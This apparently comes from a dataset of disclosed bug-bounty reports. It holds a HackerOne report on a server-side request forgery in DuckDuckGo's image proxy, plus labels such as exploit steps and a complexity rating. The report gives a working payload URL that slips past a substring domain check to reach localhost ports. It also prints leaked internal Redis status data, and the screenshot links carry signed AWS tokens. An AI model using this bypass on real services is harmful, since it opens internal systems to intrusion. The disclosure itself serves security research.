{
    "reported_to": "DuckDuckGo",
    "reported_by": "d0nut ",
    "title": "SSRF on duckduckgo.com/iu/",
    "content": "\n<image_0>\n<image_1>\nHowever, it appears that the check that ensures that yimg.com is the target domain is solely based on whether or not that string appears in the url, independent of where. This means we can stuff it in a query parameter and bypass this check.\n<image_2>\nFurthermore, with this bypass we can hit localhost and perform a port scan (see XSPA).\nFor example, I have been able to conclude that services are running on the following ports:\nCode 41 Bytes\n122\n225\n380\n4443\n5587\n66380\n76432\n86767\n96868\n108000\nSome of these services don't like talking HTTP (like 22 and 25) so they never respond, but other services seem to talk HTTP and will return seemingly sensitive data about redis.\nFor example:\nhttps://duckduckgo.com/iu/?u=http://127.0.0.1:6868%2fstatus%2f?q=http://yimg.com/ returns the following:\nCode 554 Bytes\n1{\n2  \"current_time\": \"2018-08-23T17:56:06\",\n3  \"deployment_environment\": \"prod\",\n4  \"redis_local_last_successful_ping\": \"2018-08-23T13:56:05\",\n5  \"redis_local_url\": \"redis://127.0.0.1:6380\",\n6  \"redis_regional_last_successful_ping\": \"2018-08-23T13:56:05\",\n7  \"redis_regional_url\": \"redis://cache-services.duckduckgo.com:6380\",\n8  \"stat_blocked_ips_removed_since_launch\": 8787,\n9  \"stat_blocked_ips_since_launch\": 12185,\n10  \"stat_ipset_blocks\": 266,\n11  \"stat_redis_local_messages_received\": 3613,\n12  \"stat_redis_regional_messages_received\": 10211,\n13  \"status\": \"up\"\n14}\nImpact\nThis could be used to interact with services that are not intended to be exposed. This also enables an XSPA attack. Additionally, information disclosure about a redis service.\nLastly, an attack on redis may be possible even though the requests seem restricted to http.\n\n",
    "severity": [
        7.0,
        8.9
    ],
    "bounty": null,
    "weaknesses": [
        "Server-Side Request Forgery (SSRF)"
    ],
    "screenshots": {
        "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/337/121/697dd6f78cc14fdd82da0bc3fb231b5556e06d29/yimg_ok.png?response-content-disposition=attachment%3B%20filename%3D%22yimg_ok.png%22%3B%20filename%2A%3DUTF-8%27%27yimg_ok.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSAUANJIQ%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T155825Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEMT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDozrOisAuPYm16XL3vBCvZ8E4EqussDxyfb5noZXrPDAIhAP%2FKBdUxdocTqd398q4d5xukm81YkdxzlqcxSDUI5H1NKrIFCCwQAxoMMDEzNjE5Mjc0ODQ5IgylCbw2TeguFsAZNj4qjwXjH4kwlWt6Dn5uuCQsoNoyeBqxMOm6pQtUubQ01l7QmCDywxVABfeS7kjHZKz0pBYZJRDOoviZgrlfZaQqPBrCuuZfdopHUMrIcttHgMJIpggRFgAz%2FmitCfZp601Unjp8zdZs0VgmzleQA6iAUQtXJeQk2Z8QBlrHV4NMx14xh8ozwAaHS1tjt%2B%2FA8lAqol6w%2BvsEDP08Z0xra1ilXIOXOqaik0oi9Nyjeaf5fKQfj83KepzglViZUNhH94dh9w3KLpfxw74COmCFwcUjkiJ5XzPjNe5sVd8bdVjPo8ZNbFErUqFIXaz6ti2gMFSXI7QJo65kYfmo2X%2BVius59fEoWE4yJPqGRXEDRrPQhhlbUZjrVR2ZdRnrrkpggQp8XQCo1B%2BtbYfGd44GD4KhIJfEncJ07H3c2tkTYBpgMDEv8alYLuKD5TQEXpTl%2BPZoGbS1XlyxJRtQrmDuAEKpVKNIGYJZRLLxB1FBpk%2FKqOCRuyJG8qcRpp69vhbBsRa%2FLwU8x6krYoljPc6WT0nW1Yn4K9yRPWq5165m361LLWtmq5GVX8ICBXWe9mTC4UziHJk%2Be0sUVxC%2FPMWYWosP%2B6dJbbJyZC2gKEZlX1rdZbsI%2FYJD0OqsTJ1fSMNhgKBJaChaX1XJvq7C%2F5kTS%2FRcF7mcobVUa2IGWxbG0ADYcHA4ii0qdSJY7%2ByrJtq3DU9T1AlMMisU6NSCtP822%2B6wOda4SrxGTNCsXsvv07lMM%2FTflD1j7yJvxGt8e5aaTeqeD9e4aerVXVop6QTF%2BbEtU46V4663wnrxYPw1ieCoThCTYRQFvWxymptvr4gZkamGlT34L2%2FIqbonTV%2FlYlW6FrcM6YXdH0L9ysDMWFAWUvj6MK7Gj78GOrABKPnZLQBhuUxkEfdQDRZT0DTIKNvDG%2BgvQotlI15jiW8S2HwRBYV9SlSaiGHf6hsDfptzAY3UU%2FlD5SD%2FH95cKxX1WN39wyOXyT0hSo5TD%2B53BNi6K4GH9ffgWrdXsEmt2Jm3aPF9yj6iW9BuAijaJ%2BJ%2B1QJurG1IxgAFUH6ck6jWOC5od9c9JnsU9yoZ8Tm501R9apmeI9uvays5EYDSr3zYlpvxH33nLY91xU%2F7rTM%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c42b580824b1bc1c280929a36027f0a2b80a6b5a60872427847948f2683917c8",
        "image_1": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/337/118/6a7b9487b720e1571c7a8e0afa70dc5ba4353c12/google_not_allowed.png?response-content-disposition=attachment%3B%20filename%3D%22google_not_allowed.png%22%3B%20filename%2A%3DUTF-8%27%27google_not_allowed.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSAUANJIQ%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T155825Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEMT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDozrOisAuPYm16XL3vBCvZ8E4EqussDxyfb5noZXrPDAIhAP%2FKBdUxdocTqd398q4d5xukm81YkdxzlqcxSDUI5H1NKrIFCCwQAxoMMDEzNjE5Mjc0ODQ5IgylCbw2TeguFsAZNj4qjwXjH4kwlWt6Dn5uuCQsoNoyeBqxMOm6pQtUubQ01l7QmCDywxVABfeS7kjHZKz0pBYZJRDOoviZgrlfZaQqPBrCuuZfdopHUMrIcttHgMJIpggRFgAz%2FmitCfZp601Unjp8zdZs0VgmzleQA6iAUQtXJeQk2Z8QBlrHV4NMx14xh8ozwAaHS1tjt%2B%2FA8lAqol6w%2BvsEDP08Z0xra1ilXIOXOqaik0oi9Nyjeaf5fKQfj83KepzglViZUNhH94dh9w3KLpfxw74COmCFwcUjkiJ5XzPjNe5sVd8bdVjPo8ZNbFErUqFIXaz6ti2gMFSXI7QJo65kYfmo2X%2BVius59fEoWE4yJPqGRXEDRrPQhhlbUZjrVR2ZdRnrrkpggQp8XQCo1B%2BtbYfGd44GD4KhIJfEncJ07H3c2tkTYBpgMDEv8alYLuKD5TQEXpTl%2BPZoGbS1XlyxJRtQrmDuAEKpVKNIGYJZRLLxB1FBpk%2FKqOCRuyJG8qcRpp69vhbBsRa%2FLwU8x6krYoljPc6WT0nW1Yn4K9yRPWq5165m361LLWtmq5GVX8ICBXWe9mTC4UziHJk%2Be0sUVxC%2FPMWYWosP%2B6dJbbJyZC2gKEZlX1rdZbsI%2FYJD0OqsTJ1fSMNhgKBJaChaX1XJvq7C%2F5kTS%2FRcF7mcobVUa2IGWxbG0ADYcHA4ii0qdSJY7%2ByrJtq3DU9T1AlMMisU6NSCtP822%2B6wOda4SrxGTNCsXsvv07lMM%2FTflD1j7yJvxGt8e5aaTeqeD9e4aerVXVop6QTF%2BbEtU46V4663wnrxYPw1ieCoThCTYRQFvWxymptvr4gZkamGlT34L2%2FIqbonTV%2FlYlW6FrcM6YXdH0L9ysDMWFAWUvj6MK7Gj78GOrABKPnZLQBhuUxkEfdQDRZT0DTIKNvDG%2BgvQotlI15jiW8S2HwRBYV9SlSaiGHf6hsDfptzAY3UU%2FlD5SD%2FH95cKxX1WN39wyOXyT0hSo5TD%2B53BNi6K4GH9ffgWrdXsEmt2Jm3aPF9yj6iW9BuAijaJ%2BJ%2B1QJurG1IxgAFUH6ck6jWOC5od9c9JnsU9yoZ8Tm501R9apmeI9uvays5EYDSr3zYlpvxH33nLY91xU%2F7rTM%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=75cb192cba71d211df7e577a2292869c9b21fc15055b8f293cd6745364a977da",
        "image_2": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/337/120/d0c6a4bad5b9c6dde8e4f407ec06e64c0205309a/query_param_bypass.png?response-content-disposition=attachment%3B%20filename%3D%22query_param_bypass.png%22%3B%20filename%2A%3DUTF-8%27%27query_param_bypass.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSAUANJIQ%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T155825Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEMT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDozrOisAuPYm16XL3vBCvZ8E4EqussDxyfb5noZXrPDAIhAP%2FKBdUxdocTqd398q4d5xukm81YkdxzlqcxSDUI5H1NKrIFCCwQAxoMMDEzNjE5Mjc0ODQ5IgylCbw2TeguFsAZNj4qjwXjH4kwlWt6Dn5uuCQsoNoyeBqxMOm6pQtUubQ01l7QmCDywxVABfeS7kjHZKz0pBYZJRDOoviZgrlfZaQqPBrCuuZfdopHUMrIcttHgMJIpggRFgAz%2FmitCfZp601Unjp8zdZs0VgmzleQA6iAUQtXJeQk2Z8QBlrHV4NMx14xh8ozwAaHS1tjt%2B%2FA8lAqol6w%2BvsEDP08Z0xra1ilXIOXOqaik0oi9Nyjeaf5fKQfj83KepzglViZUNhH94dh9w3KLpfxw74COmCFwcUjkiJ5XzPjNe5sVd8bdVjPo8ZNbFErUqFIXaz6ti2gMFSXI7QJo65kYfmo2X%2BVius59fEoWE4yJPqGRXEDRrPQhhlbUZjrVR2ZdRnrrkpggQp8XQCo1B%2BtbYfGd44GD4KhIJfEncJ07H3c2tkTYBpgMDEv8alYLuKD5TQEXpTl%2BPZoGbS1XlyxJRtQrmDuAEKpVKNIGYJZRLLxB1FBpk%2FKqOCRuyJG8qcRpp69vhbBsRa%2FLwU8x6krYoljPc6WT0nW1Yn4K9yRPWq5165m361LLWtmq5GVX8ICBXWe9mTC4UziHJk%2Be0sUVxC%2FPMWYWosP%2B6dJbbJyZC2gKEZlX1rdZbsI%2FYJD0OqsTJ1fSMNhgKBJaChaX1XJvq7C%2F5kTS%2FRcF7mcobVUa2IGWxbG0ADYcHA4ii0qdSJY7%2ByrJtq3DU9T1AlMMisU6NSCtP822%2B6wOda4SrxGTNCsXsvv07lMM%2FTflD1j7yJvxGt8e5aaTeqeD9e4aerVXVop6QTF%2BbEtU46V4663wnrxYPw1ieCoThCTYRQFvWxymptvr4gZkamGlT34L2%2FIqbonTV%2FlYlW6FrcM6YXdH0L9ysDMWFAWUvj6MK7Gj78GOrABKPnZLQBhuUxkEfdQDRZT0DTIKNvDG%2BgvQotlI15jiW8S2HwRBYV9SlSaiGHf6hsDfptzAY3UU%2FlD5SD%2FH95cKxX1WN39wyOXyT0hSo5TD%2B53BNi6K4GH9ffgWrdXsEmt2Jm3aPF9yj6iW9BuAijaJ%2BJ%2B1QJurG1IxgAFUH6ck6jWOC5od9c9JnsU9yoZ8Tm501R9apmeI9uvays5EYDSr3zYlpvxH33nLY91xU%2F7rTM%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9fb29772f5388d98724a989dbe8d9a605eff8411b8bd358a908b8b45aa63492f"
    },
    "disclosed_date": 1536538320,
    "report_url": "https://hackerone.com/reports/398641",
    "is_multi_component": true,
    "complexity": "HIGH",
    "novelty": "HIGH",
    "vuln_category": "WEB_APP",
    "steps": [
        [
            1,
            "Identify the SSRF vulnerability in duckduckgo.com/iu/ by observing that the domain check for 'yimg.com' is based on string presence rather than proper URL parsing."
        ],
        [
            2,
            "Exploit the vulnerability by inserting 'yimg.com' into a query parameter to bypass the check and target localhost, performing a port scan to identify open ports."
        ],
        [
            3,
            "Interact with discovered services (e.g., Redis on port 6868) by crafting requests to endpoints like /status/ to retrieve sensitive information."
        ]
    ],
    "vuln_description": "The vulnerability is a Server-Side Request Forgery (SSRF) in duckduckgo.com/iu/ where the domain validation for 'yimg.com' can be bypassed by including the string in a query parameter. This allows an attacker to make requests to internal services, perform port scanning, and retrieve sensitive data from services like Redis.",
    "reason": "The attack involves understanding URL parsing flaws and leveraging them to bypass domain checks, then using this to interact with internal services. While the initial bypass is straightforward, the subsequent steps require knowledge of internal service endpoints and their responses.",
    "new_complexity": "MEDIUM",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}